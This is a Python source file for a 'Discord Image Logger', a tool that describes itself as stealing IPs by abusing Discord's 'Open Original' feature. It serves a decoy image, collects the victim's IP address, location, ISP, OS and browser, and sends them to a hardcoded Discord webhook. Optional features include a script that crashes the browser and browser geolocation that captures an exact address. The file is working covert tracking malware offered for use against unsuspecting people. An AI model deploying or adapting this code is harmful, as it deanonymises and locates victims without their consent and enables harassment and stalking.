# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1335017176729387204/ZdEEMsnZUijK--DcGtxcdUAuad31VKjDqJcne7ri9Snl22CSoXg44mct8sq1e2ZpVIDi",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
